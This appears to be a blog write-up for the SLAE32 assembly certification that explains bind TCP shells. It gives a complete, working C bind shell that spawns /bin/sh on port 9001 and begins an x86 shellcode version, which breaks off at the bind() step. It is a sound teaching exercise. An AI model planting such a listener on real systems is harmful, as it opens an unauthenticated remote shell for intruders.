---
title: SLAE32 - Assignment#1 [Bind TCP Shell]
author: bigb0ss
date: 2020-12-12 13:26:00 +0800
categories: [SLAE32]
tags: [slae32, assembly, x86, Bind TCP Shell]
image: /assets/img/post/slae32/slae32.png
---

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1542

# Assignement #1 
* Create a Shell_Bind_TCP shellcode
	- Binds to a port
	- Execs Shell on incoming connection

* Port number should be easily configurable


# What is a Bind Shell?
Bind TCP opens up a port on the victim system. If an attacker could exploit a vulnerability on the victim system, she can implant a bind shell and connect to it from the remote attaking box. However, due to a firewall and detection controls, reverse TCP shell is preferrable over bind TCP shell thesedays.

![image](/assets/img/post/slae32/assignment1/01.png)


# Socket Programming
Before creating our Bind TCP Shell in shellcode, we need to understand the Socket Programming. 

> **NOTE**: Socket programming is a way of connecting two nodes on a network to communicate with each other. 

![image](/assets/img/post/slae32/assignment1/02.png)

To better understand the Bind TCP, let's create a Bind TCP Shell in a higher programming language. We will use `C`:

```c++
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
	int sockfd, acceptfd;
	int port = 9001;

	struct sockaddr_in addr;
	addr.sin_family = AF_INET; 
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = INADDR_ANY;

	// 1) Socket Creation (sys_socket 1)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// 2) Bind() Syscall (sys_bind 2)
	bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));
	
	// 3) Listen() Syscall (sys_listen 4)
	listen(sockfd, 0);

	// 4) Accetpt() Syscall (sys_accept 5)
	acceptfd = accept(sockfd, NULL, NULL);

	// 5) Dup2() Syscall
	dup2(acceptfd, 0);	// stdin
	dup2(acceptfd, 1);	// stdout
	dup2(acceptfd, 2);	// stderr

	// 6) Execve() Syscall
	execve("/bin/sh", NULL, NULL);

	return 0;
}
```

Let's compile this: 

```console
gcc bind-tcp-shell.c -o bind-tcp-shell
```

The compiled binary can successfully open up a bind shell, and we can connect to it via `nc`.

![image](/assets/img/post/slae32/assignment1/03.png)


# Shellcode 

For our Bind TCP Shell shellcode, we need to use all those `syscalls`:
* 1) Socket - Initiating the socket connection
* 2) Bind - The `bind()` assigns the address specified by addr to the socket referred to by the file descriptor `sockfd`. 
* 3) Listen - Listen for the incoming connection
* 4) Accept - The  `accept()`  system call is used with connection-based socket types (SOCK_STREAM, SOCK_SEQPACKET)
* 5) Dup2 - Manages `stdin`, `stdout` and `stderr` for the file descriptor. This is necessary for input and output redirection. 
* 6) Execve - Execute a command (`/bin/sh` to spawn a shell)

## Syscall + Function Calls

First, we need to collect arguemnts for `socketcall()` as well as other `syscalls`. 

> **NOTE**: socketcall()  is  a  common  kernel  entry point for the socket system calls.

By querying `/usr/include/i386-linux-gnu/asm/unistd_32.h`, we can collect the following args for the `syscalls`:

```console
#define __NR_socketcall	102 --> Hex: 0x66
#define __NR_bind		361 --> Hex: 0x169
#define __NR_listen		363 --> Hex: 0x16b
#define __NR_accept4	364 --> Hex: 0x16c
#define __NR_dup2		63  --> Hex: 0x3f
#define __NR_execve		11  --> Hex: 0xb
```

Additionally, by looking at `/usr/include/linux/net.h`, we can also obtain args for the function calls:

```console
root@kali:~/Documents/SLAE32/Exam/Assignement1# cat /usr/include/linux/net.h | grep SYS
#define SYS_SOCKET		1		/* sys_socket(2)			*/
#define SYS_BIND		2		/* sys_bind(2)				*/
#define SYS_CONNECT		3		/* sys_connect(2)			*/
#define SYS_LISTEN		4		/* sys_listen(2)			*/
#define SYS_ACCEPT		5		/* sys_accept(2)			*/
#define SYS_GETSOCKNAME	6		/* sys_getsockname(2)		*/
#define SYS_GETPEERNAME	7		/* sys_getpeername(2)		*/
#define SYS_SOCKETPAIR	8		/* sys_socketpair(2)		*/
#define SYS_SEND		9		/* sys_send(2)				*/
#define SYS_RECV		10		/* sys_recv(2)				*/
#define SYS_SENDTO		11		/* sys_sendto(2)			*/
#define SYS_RECVFROM	12		/* sys_recvfrom(2)			*/
#define SYS_SHUTDOWN	13		/* sys_shutdown(2)			*/
#define SYS_SETSOCKOPT	14		/* sys_setsockopt(2)		*/
#define SYS_GETSOCKOPT	15		/* sys_getsockopt(2)		*/
#define SYS_SENDMSG		16		/* sys_sendmsg(2)			*/
#define SYS_RECVMSG		17		/* sys_recvmsg(2)			*/
#define SYS_ACCEPT4		18		/* sys_accept4(2)			*/
#define SYS_RECVMMSG	19		/* sys_recvmmsg(2)			*/
#define SYS_SENDMMSG	20		/* sys_sendmmsg(2)			*/
```

## Initialization

First, let's zero out some of the registers we are going to use:

```s
global _start

section		.text
_start:

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
```

## Socket()

Let's create the `socket()` shellcode:

```s
; 1) Socket Creation
; sockfd = socket(AF_INET, SOCK_STREAM, 0);

mov al, 0x66		; #define __NR_socketcall 102	--> Hex: 0x66
mov bl, 0x1			; #define SYS_SOCKET 1
push edx			; int protocol = 0
push ebx			; int SOCK_STREAM = 1
push 0x2			; int AF_INET = 2
mov ecx, esp		; Move stack pointer to ECX
int 0x80			; Execute
mov edi, eax		; Save the socketcall file descriptor to EDI
```

## Bind()

Let's create the `bind()` shellcode:

```s
; 2) Bind
; bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));
;
; 	struct sockaddr_in addr;
;	addr.sin_family = AF_INET; 
;	addr.sin_port = htons(port);
;	addr.sin_addr.s_addr = INADDR_ANY;


```








